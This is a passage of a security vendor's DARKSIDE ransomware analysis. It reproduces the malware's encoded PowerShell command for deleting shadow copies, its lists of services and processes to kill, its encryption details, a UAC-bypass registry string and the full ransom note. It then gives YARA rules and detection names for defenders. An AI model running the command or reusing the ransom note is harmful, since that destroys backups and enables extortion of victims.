      <td width="623" valign="top"><p>powershell -ep bypass -c
          &quot;(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F7763<br />
          6F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex
        $s&quot;</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: Encoded PowerShell command</span></p>
 <p>The decoded command from Figure 4 is &quot;Get-WmiObject
  Win32_Shadowcopy | ForEach-Object {$_.Delete();}.&quot; If the malware
  is not running under WOW64, it uses COM objects and WMI commands to
  delete volume shadow copies. The decrypted strings in Figure 9 are
  used to facilitate this process.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>root/cimv2<br /> SELECT * FROM
          Win32_ShadowCopy<br /> Win32_ShadowCopy.ID='%s'</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: Decrypted strings related to shadow
    copy deletion</span></p>
 <p>
  <i>System Manipulation</i></p>
 <p>Any service the name of which contains one of the strings listed in
  Figure 10 is stopped and deleted.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="390"><p>vss<br /> sql<br /> svc$<br /> memtas<br />
          mepocs<br /> sophos<br /> veeam<br /> backup</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 10: Service-related strings</span></p>
 <p>The version observed in May 2021 is additionally configured to stop
  and delete services containing the strings listed in Figure 11.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="390"><p>GxVss<br /> GxBlr<br /> GxFWD<br /> GxCVD<br />
        GxCIMgr</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 11: Additional service-related strings in
    May version</span></p>
 <p>Any process name containing one of the strings listed in Figure 12
  is terminated.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="360"><p>sql<br /> oracle<br /> ocssd<br /> dbsnmp<br />
          synctime<br /> agntsvc<br /> isqlplussvc<br /> xfssvccon<br />
          mydesktopservice<br /> ocautoupds<br /> encsvc<br />
          firefox<br /> tbirdconfig<br /> mydesktopqos<br /> ocomm<br />
          dbeng50<br /> sqbcoreservice<br /> excel<br /> infopath<br />
          msaccess<br /> mspub<br /> onenote<br /> outlook<br />
          powerpnt<br /> steam<br /> thebat<br /> thunderbird<br />
          visio<br /> winword<br /> wordpad<br /> notepad</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 12: Process-related strings</span></p>
 <p>
  <i>File Encryption</i></p>
 <p>Based on its configuration, the malware targets fixed and removable
  disks as well as network shares. Some processes may be terminated so
  associated files can be successfully encrypted. However, the malware
  does not terminate processes listed in Figure 13.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="366" valign="top"><p>vmcompute.exe<br /> vmms.exe<br />
          vmwp.exe<br /> svchost.exe<br /> TeamViewer.exe<br />
        explorer.exe</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 13: Processes not targeted for termination</span></p>
 <p>The malware uses the strings listed in Figure 14 to ignore certain
  directories during the encryption process.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="372" valign="top"><p>windows<br /> appdata<br />
          application data<br /> boot<br /> google<br /> mozilla<br />
          program files<br /> program files (x86)<br />
          programdata<br /> system volume information<br /> tor
          browser<br /> windows.old<br /> intel<br /> msocache<br />
          perflogs<br /> x64dbg<br /> public<br /> all users<br />
        default</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 14: Strings used to ignore directories</span></p>
 <p>The files listed in Figure 15 are ignored.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="372" valign="top"><p>$recycle.bin<br />
          config.msi<br /> $windows.~bt<br /> $windows.~ws</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 15: Ignored files</span></p>
 <p>The version observed in May 2021 is additionally configured to
  ignore the files listed in Figure 16.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="372" valign="top"><p>autorun.inf<br /> boot.ini<br />
          bootfont.bin<br /> bootsect.bak<br /> desktop.ini<br />
          iconcache.db<br /> ntldrntuser.dat<br /> ntuser.dat<br />
          logntuser.ini<br /> thumbs.db</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 16: Additional ignored files in May version</span></p>
 <p>Additional files are ignored based on the extensions listed in
  Figure 17.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>.386, .adv, .ani, .bat, .bin,
          .cab, .cmd, .com, .cpl, .cur, .deskthemepack, .diagcab,
          .diagcfg, .diagpkg, .dll, .drv, .exe, .hlp, .icl, .icns, .ico,
          .ics, .idx, .ldf, .lnk, .mod, .mpa, .msc, .msp, .msstyles,
          .msu, .nls, .nomedia, .ocx, .prf, .ps1, .rom, .rtp, .scr,
          .shs, .spl, .sys, .theme, .themepack, .wpx, .lock, .key, .hta,
          .msi, .pdb</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 17: Ignored file extensions</span></p>
 <p>Files are encrypted using Salsa20 and a key randomly generated using
  RtlRandomEx. Each key is encrypted using the embedded RSA-1024 public key.</p>
 <p>
  <i>Ransom Note</i></p>
 <p>The malware writes the ransom note shown in Figure 18 to
  <i>README&lt;ransom_ext&gt;.TXT</i> files written to directories it traverses.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>----------- [ Welcome to Dark ]
        -------------&gt;</p> <p>What happend?<br />
          ----------------------------------------------<br /> Your
          computers and servers are encrypted, backups are deleted. We
          use strong encryption algorithms, so you cannot decrypt your
          data.<br /> But you can restore everything by purchasing a
          special program from us - universal decryptor. This program
          will restore all your network.<br /> Follow our instructions
          below and you will recover all your data.</p> <p>Data
          leak<br />
          ----------------------------------------------<br /> First of
          all we have uploaded more then 100 GB data.</p> <p>Example of
          data:<br />  - Accounting data<br />  - Executive data<br />
           - Sales data<br />  - Customer Support data<br />  -
          Marketing data<br />  - Quality data<br />  - And more
        other...</p> <p>Your personal leak page:
          http://darksidedxcftmqa[.]onion/blog/article/id/6/&lt;REDACTED&gt;<br />
          The data is preloaded and will be automatically published if
          you do not pay.<br /> After publication, your data will be
          available for at least 6 months on our tor cdn servers.</p>
          <p>We are ready:<br /> - To provide you the evidence of stolen
          data<br /> - To give you universal decrypting tool for all
          encrypted files.<br /> - To delete all the stolen data.</p>
          <p>What guarantees?<br />
          ----------------------------------------------<br /> We value
          our reputation. If we do not do our work and liabilities,
          nobody will pay us. This is not in our interests.<br /> All
          our decryption software is perfectly tested and will decrypt
          your data. We will also provide support in case of
          problems.<br /> We guarantee to decrypt one file for free. Go
          to the site and contact us.</p> <p>How to get access on
          website?<br />
          ----------------------------------------------<br /> Using a
          TOR browser:<br /> 1) Download and install TOR browser from
          this site: https://torproject.org/<br /> 2) Open our website:
          http://darksidfqzcuhtk2[.]onion/&lt;REDACTED&gt;<br /> </p>
          <p>When you open our website, put the following data in the
          input form:<br /> Key:<br /> &lt;REDACTED&gt;</p> <p>!!!
          DANGER !!!<br /> DO NOT MODIFY or try to RECOVER any files
          yourself. We WILL NOT be able to RESTORE them.<br /> !!!
          DANGER !!!</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 18: Ransom note</span></p>
 <p>
  <i>Decrypted Strings</i></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623"
          valign="top"><p>Global\XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br />
          https://google.com/api/version<br />
          https://yahoo.com/v2/api<br /> sql<br /> sqlite<br />
          $recycle.bin<br /> config.msi<br /> $windows.~bt<br />
          $windows.~ws<br /> windows<br /> appdata<br /> application
          data<br /> boot<br /> google<br /> mozilla<br /> program
          files<br /> program files (x86)<br /> programdata<br /> system
          volume information<br /> tor browser<br /> windows.old<br />
          intel<br /> msocache<br /> perflogs<br /> x64dbg<br />
          public<br /> all users<br /> default<br /> 386<br /> adv<br />
          ani<br /> bat<br /> bin<br /> cab<br /> cmd<br /> com<br />
          cpl<br /> cur<br /> deskthemepack<br /> diagcab<br />
          diagcfg<br /> diagpkg<br /> dll<br /> drv<br /> exe<br />
          hlp<br /> icl<br /> icns<br /> ico<br /> ics<br /> idx<br />
          ldf<br /> lnk<br /> mod<br /> mpa<br /> msc<br /> msp<br />
          msstyles<br /> msu<br /> nls<br /> nomedia<br /> ocx<br />
          prf<br /> ps1<br /> rom<br /> rtp<br /> scr<br /> shs<br />
          spl<br /> sys<br /> theme<br /> themepack<br /> wpx<br />
          lock<br /> key<br /> hta<br /> msi<br /> pdb<br />
          vmcompute.exe<br /> vmms.exe<br /> vmwp.exe<br />
          svchost.exe<br /> TeamViewer.exe<br /> explorer.exe<br />
          oracle<br /> ocssd<br /> dbsnmp<br /> synctime<br />
          agntsvc<br /> isqlplussvc<br /> xfssvccon<br />
          mydesktopservice<br /> ocautoupds<br /> encsvc<br />
          firefox<br /> tbirdconfig<br /> mydesktopqos<br /> ocomm<br />
          dbeng50<br /> sqbcoreservice<br /> excel<br /> infopath<br />
          msaccess<br /> mspub<br /> onenote<br /> outlook<br />
          powerpnt<br /> steam<br /> thebat<br /> thunderbird<br />
          visio<br /> winword<br /> wordpad<br /> notepad<br />
          vss<br /> sql<br /> svc$<br /> memtas<br /> mepocs<br />
          sophos<br /> veeam<br /> backup<br />
          \r\nblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblah\r\nblahblahblahblahblahblahbl<br />
          ahblahblahblahblahblahblahblahblahblah\r\nblahblahblahblahblahblahblahblahblahblahblahblahblahblah<br />
          blahblah\r\nblahblahblah\r\n<br /> \r\n----------- [ Welcome
          to Dark ] -------------&gt;\r\n\r\nWhat
          happend?\r\n----------------------------------------------\r\nYour
          computers and servers are encrypted, backups are deleted. We
          use strong encryption algorithms, so you cannot decrypt your
          data.\r\nBut you can restore everything by purchasing a
          special program from us - universal decryptor. This program
          will restore all your network.\r\nFollow our instructions
          below and you will recover all your data.\r\n\r\nData
          leak\r\n----------------------------------------------\r\nFirst
          of all we have uploaded more then 100 GB data.\r\n\r\nExample
          of data:\r\n - Accounting data\r\n - Executive data\r\n -
          Sales data\r\n - Customer Support data\r\n - Marketing
          data\r\n - Quality data\r\n - And more other...\r\n\r\nYour
          personal leak page:
          http://darksidedxcftmqa[.]onion/blog/article/id/6/&lt;REDACTED&gt;The
          data is preloaded and will be automatically published if you
          do not pay.\r\nAfter publication, your data will be available
          for at least 6 months on our tor cdn servers.\r\n\r\nWe are
          ready:\r\n- To provide you the evidence of stolen data\r\n- To
          give you universal decrypting tool for all encrypted
          files.\r\n- To delete all the stolen data.\r\n\r\nWhat
          guarantees?\r\n----------------------------------------------\r\nWe
          value our reputation. If we do not do our work and
          liabilities, nobody will pay us. This is not in our
          interests.\r\nAll our decryption software is perfectly tested
          and will decrypt your data. We will also provide support in
          case of problems.\r\nWe guarantee to decrypt one file for
          free. Go to the site and contact us.\r\n\r\nHow to get access
          on website?
          \r\n----------------------------------------------\r\nUsing a
          TOR browser:\r\n1) Download and install TOR browser from this
          site: https://torproject.org/\r\n2) Open our website:
          http://darksidfqzcuhtk2[.]onion/&lt;REDACTED&gt;\r\n\r\nWhen
          you open our website, put the following data in the input
          form:\r\nKey:\r\&lt;REDACTED&gt;\r\n\r\n!!! DANGER !!!\r\nDO
          NOT MODIFY or try to RECOVER any files yourself. We WILL NOT
          be able to RESTORE them. \r\n!!! DANGER !!!\r\n<br />
          -path<br /> INF<br /> DBG<br /> /C DEL /F /Q<br />  &gt;&gt;
          NUL<br /> ComSpec<br /> README<br /> .TXT<br /> Start
          Encrypting Target Folder<br /> Encrypt Mode - AUTO<br />
          Started %u I/O Workers<br /> Encrypted %u file(s)<br /> Start
          Encrypt<br /> [Handle %u]<br /> File Encrypted
          Successful<br /> Encrypt Mode - FAST<br /> Encrypt Mode -
          FULL<br /> This is a Russian-Speaking System, Exit<br />
          System Language Check<br /> Encrypting Network Shares<br />
          Encrypting Local Disks<br /> README<br /> .TXT<br /> Encrypt
          Mode - AUTO<br /> Started %u I/O Workers<br /> Encrypted %u
          file(s)<br /> Start Encrypt<br /> [Handle %u]<br /> File
          Encrypted Successful<br /> Encrypt Mode - FAST<br /> Encrypt
          Mode - FULL<br /> Terminating Processes<br /> Deleting Shadow
          Copies<br /> Uninstalling Services<br /> Emptying Recycle
          Bin<br /> This is a Russian-Speaking System, Exit<br /> System
          Language Check<br /> Start Encrypting All Files<br />
          powershell -ep bypass -c
          &quot;(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F7763<br />
          6F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2<br />
          *$_,2))};iex $s&quot;<br /> root/cimv2<br /> WQL<br /> SELECT
          * FROM Win32_ShadowCopy<br /> ID<br />
          Win32_ShadowCopy.ID='%s'<br /> .exe<br /> LOG%s.TXT<br />
          README%s.TXT<br />
          Software\Classes\exefile\shell\open\command<br />
          \slui.exe<br /> runas<br /> Elevation:Administrator!new:<br />
          {3E5FC7F9-9A51-4367-9063-A120244FBEC7}<br /> explorer.exe</p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 19: Decrypted strings</span></p>
 <h4>Appendix B: Indicators for Detection and Hunting</h4>
 <p>
  <i>Yara Detections</i></p>
 <p>The following YARA rules are not intended to be used on production
  systems or to inform blocking rules without first being validated
  through an organization's own internal testing processes to ensure
  appropriate performance and limit the risk of false positives. These
  rules are intended to serve as a starting point for hunting efforts to
  identify related activity; however, they may need adjustment over time
  if the malware family changes.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span class="code">rule
          Ransomware_Win_DARKSIDE_v1__1<br />  {<br />      meta:<br />
                  author = “FireEye”<br />          date_created =
          “2021-03-22”<br />          description = “Detection for early
          versions of DARKSIDE ransomware samples based on the
          encryption mode configuration values.”<br />          md5 =
          “1a700f845849e573ab3148daef1a3b0b”   <br />     
          strings:<br />          $consts = { 80 3D [4] 01 [1-10] 03 00
          00 00 [1-10] 03 00 00 00 [1-10] 00 00 04 00 [1-10] 00 00 00 00
          [1-30] 80 3D [4] 02 [1-10] 03 00 00 00 [1-10] 03 00 00 00
          [1-10] FF FF FF FF [1-10] FF FF FF FF [1-30] 03 00 00 00
          [1-10] 03 00 00 00 }<br />      condition:<br />         
          (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)
          and $consts<br />  }</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 20: DARKSIDE YARA rule</span></p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">rule Dropper_Win_Darkside_1<br />  {<br />
              meta:<br />          author = &quot;FireEye&quot;<br />   
                date_created = &quot;2021-05-11&quot;<br />         
          description = &quot;Detection for on the binary that was used
          as the dropper leading to DARKSIDE.&quot;<br />     
          strings:<br />          $CommonDLLs1 =
          &quot;KERNEL32.dll&quot; fullword<br />          $CommonDLLs2
          = &quot;USER32.dll&quot; fullword<br />          $CommonDLLs3
          = &quot;ADVAPI32.dll&quot; fullword<br />         
          $CommonDLLs4 = &quot;ole32.dll&quot; fullword<br />         
          $KeyString1 = { 74 79 70 65 3D 22 77 69 6E 33 32 22 20 6E 61
          6D 65 3D 22 4D 69 63 72 6F 73 6F 66 74 2E 57 69 6E 64 6F 77 73
          2E 43 6F 6D 6D 6F 6E 2D 43 6F 6E 74 72 6F 6C 73 22 20 76 65 72
          73 69 6F 6E 3D 22 36 2E 30 2E 30 2E 30 22 20 70 72 6F 63 65 73
          73 6F 72 41 72 63 68 69 74 65 63 74 75 72 65 3D 22 78 38 36 22
          20 70 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 22 36 35 39 35
          62 36 34 31 34 34 63 63 66 31 64 66 22 }<br />         
          $KeyString2 = { 74 79 70 65 3D 22 77 69 6E 33 32 22 20 6E 61
          6D 65 3D 22 4D 69 63 72 6F 73 6F 66 74 2E 56 43 39 30 2E 4D 46
          43 22 20 76 65 72 73 69 6F 6E 3D 22 39 2E 30 2E 32 31 30 32 32
          2E 38 22 20 70 72 6F 63 65 73 73 6F 72 41 72 63 68 69 74 65 63
          74 75 72 65 3D 22 78 38 36 22 20 70 75 62 6C 69 63 4B 65 79 54
          6F 6B 65 6E 3D 22 31 66 63 38 62 33 62 39 61 31 65 31 38 65 33
          62 22 }<br />          $Slashes = { 7C 7C 7C 7C 7C 7C 7C 7C 7C
          7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C }<br />      condition:<br />
                  filesize &lt; 2MB and filesize &gt; 500KB and
          uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and
          (all of ($CommonDLLs*)) and (all of ($KeyString*)) and
          $Slashes<br />  }</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 21: DARKSIDE Dropper YARA rule</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="624" valign="top"><span class="code">rule
          Backdoor_Win_C3_1<br />  {<br />      meta:<br />         
          author = “FireEye”<br />          date_created =
          &quot;2021-05-11&quot;<br />          description =
          &quot;Detection to identify the Custom Command and Control
          (C3) binaries.&quot;<br />          md5 =
          &quot;7cdac4b82a7573ae825e5edb48f80be5&quot;<br />     
          strings:<br />          $dropboxAPI =
          &quot;Dropbox-API-Arg&quot;<br />          $knownDLLs1 =
          &quot;WINHTTP.dll&quot; fullword<br />          $knownDLLs2 =
          &quot;SHLWAPI.dll&quot; fullword<br />          $knownDLLs3 =
          &quot;NETAPI32.dll&quot; fullword<br />          $knownDLLs4 =
          &quot;ODBC32.dll&quot; fullword<br />          $tokenString1 =
          { 5B 78 5D 20 65 72 72 6F 72 20 73 65 74 74 69 6E 67 20 74 6F
          6B 65 6E }<br />          $tokenString2 = { 5B 78 5D 20 65 72
          72 6F 72 20 63 72 65 61 74 69 6E 67 20 54 6F 6B 65 6E }<br />
                  $tokenString3 = { 5B 78 5D 20 65 72 72 6F 72 20 64 75
          70 6C 69 63 61 74 69 6E 67 20 74 6F 6B 65 6E }<br />     
          condition:<br />          filesize &lt; 5MB and uint16(0) ==
          0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (((all of
          ($knownDLLs*)) and ($dropboxAPI or (1 of ($tokenString*)))) or
          (all of ($tokenString*)))</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 22: Custom Command and Control (C3) YARA rule</span></p>
 <p>
  <i>Detecting DARKSIDE</i></p>
 <p>FireEye products detect this activity at multiple stages of the
  attack lifecycle. The following table contains specific detections
  intended to identify and prevent malware and methods seen at these
  intrusions. For brevity, this list does not include FireEye’s existing
  detections for BEACON, BloodHound/SharpHound, and other common tools
  and malware that FireEye has observed both in this campaign and across
  a broad range of intrusion operations</p>
 <table border="0" cellspacing="0" cellpadding="0" width="0"> <tbody>
    <tr>
      <td><p>
          <b>Platform(s)</b></p> </td> <td><p>
          <b>Detection Name</b></p> </td> </tr>
    <tr>
      <td><p>Network Security<br /> Email Security<br /> Detection On
          Demand<br /> Malware Analysis<br /> File Protect</p> </td>
          <td><ul> <li>Ransomware.SSL.DarkSide</li>
          <li>Trojan.Generic</li> <li>Ransomware.Linux.DARKSIDE</li>
          <li>Ransomware.Win.Generic.MVX</li>
          <li>Ransomware.Win.DARKSIDE.MVX</li>
          <li>Ransomware.Linux.DARKSIDE.MVX</li>
          <li>Ransomware.Win32.DarkSide.FEC3</li>
          <li>FE_Ransomware_Win_DARKSIDE_1</li>
          <li>FE_Ransomware_Win32_DARKSIDE_1</li>
          <li>FE_Ransomware_Linux64_DARKSIDE_1</li>
          <li>FE_Ransomware_Linux_DARKSIDE_1</li>
          <li>FEC_Trojan_Win32_Generic_62</li>
          <li>FE_Loader_Win32_Generic_177</li>
          <li>FE_Loader_Win32_Generic_197</li>
          <li>FE_Backdoor_Win_C3_1</li> <li>FE_Backdoor_Win32_C3_1</li>
          <li>FE_Backdoor_Win32_C3_2</li> <li>FE_Backdoor_Win_C3_2</li>
          <li>Backdoor.Win.C3</li> <li>FE_Dropper_Win_Darkside_1</li>
        </ul> </td> </tr>
    <tr>
      <td><p>Endpoint Security</p> </td> <td><p>
          <b>Real-Time (IOC)</b></p> <ul> <li>BABYMETAL (BACKDOOR)</li>
            <li>DARKSIDE RANSOMWARE (FAMILY)</li> <li>SUSPICIOUS
            POWERSHELL USAGE (METHODOLOGY)</li> <li>SUSPICIOUS
            POWERSHELL USAGE B (METHODOLOGY)<br /> <b>
              <br /> </b></li> </ul> <p>
          <b>Malware Protection(AV/MG)</b></p> <ul>
          <li>Generic.mg.*</li> <li>Gen:Heur.FKP.17</li>
          <li>Gen:Heur.Ransom.RTH.1</li>
          <li>Gen:Trojan.Heur.PT.omZ@bSEA3vk</li>
          <li>Gen:Variant.Razy.*</li> <li>Trojan.CobaltStrike.CB</li>
          <li>Trojan.GenericKD.*</li> <li>Trojan.Linux.Ransom.H<br /> <b>
              <br /> </b></li> </ul> <p>
          <b>UAC Protect</b></p> <ul> <li>Malicious UAC bypass program
          detected</li> </ul> </td> </tr>
    <tr>
      <td><p>Helix</p> </td> <td><ul> <li>VPN ANALYTICS [Abnormal
          Logon]</li> <li>WINDOWS ANALYTICS [Abnormal RDP Logon]</li>
            <li>TEAMVIEWER CLIENT [User-Agent]</li> <li>WINDOWS
            METHODOLOGY [Plink Reverse Tunnel]</li> <li>WINDOWS
            METHODOLOGY - SERVICES [PsExec]</li> </ul> </td> </tr></tbody></table>
 <p>
  <i>Mandiant Security Validation Actions</i></p>
 <p>Organizations can validate their security controls using the
  following actions with <a
    href="/content/fireeye-www/en_US/mandiant/security-validation.html"
    title="https://www.fireeye.com/mandiant/security-validation.html">Mandiant
    Security Validation</a>.</p>
 <table border="0" cellspacing="0" cellpadding="0" width="640"> <tbody>
    <tr>
      <td width="87" valign="bottom"><p>
          <b>VID</b></p> </td> <td width="553" valign="bottom"><p>
          <b>Title</b></p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-700 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #2 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-701 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #3 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-702 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #4 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-703 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #5 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-704 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #6 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-705 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #7 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-706 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #8 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-707 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #9 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-708 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #10 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-709 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #11 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-710 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #12 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-711 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #13 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-712 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #14 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-713 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #15 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-714 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #16 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-715 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #17 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-716 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #18 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-717 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #19 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-718 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #20 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-719 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #21 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-720 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #22 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-721 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #23 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-722 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #24 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-723 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #25 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-724 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #26 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-725 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #27 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-726 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #28 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-727 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #29 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-728 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #30 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-729 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #31 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-730 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #32 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-731 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #33 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-732 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #34 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-733 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #35 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-734 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          DARKSIDE, Download, Variant #36 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-735 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer - NGROK,
          Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-736 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer -
          UNC2465, LNK Downloader for SMOKEDHAM, Download </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-737 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer - BEACON,
          Download, Variant #3 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-738 </p> </td> <td
        width="553" valign="bottom"><p>Data Exfiltration - RCLONE, Exfil
          Over SFTP </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-739 </p> </td> <td
        width="553" valign="bottom"><p>Malicious File Transfer - RCLONE,
          Download, Variant #2 </p> </td> </tr>
    <tr>
      <td width="87" valign="bottom"><p>A101-740 </p> </td> <td
        width="553" valign="bottom"><p>Command and Control - DARKSIDE,
